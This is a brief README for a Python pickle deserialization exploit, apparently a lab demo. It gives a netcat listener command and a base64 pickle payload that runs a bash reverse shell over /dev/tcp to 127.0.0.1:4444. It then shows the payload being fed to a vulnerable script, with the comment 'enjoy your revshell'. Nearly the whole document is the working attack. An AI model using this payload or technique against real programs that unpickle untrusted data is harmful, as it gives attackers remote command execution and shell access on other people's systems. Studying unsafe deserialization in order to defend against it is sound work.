# pickle deserialize Exploit

## Quick Start

Terminal 1.
```
$ nc -nvvlp 4444
```

Terminal 2.
```bash
$ python3 pickle_exp.py3
b'gASVTAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDFiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS80NDQ0IDA-JjEilIWUUpQu'

$ python3 pickle_vul.py3 'gASVTAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDFiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS80NDQ0IDA-JjEilIWUUpQu'
<enjoy your revshell in Terminal 1.  =)>
```


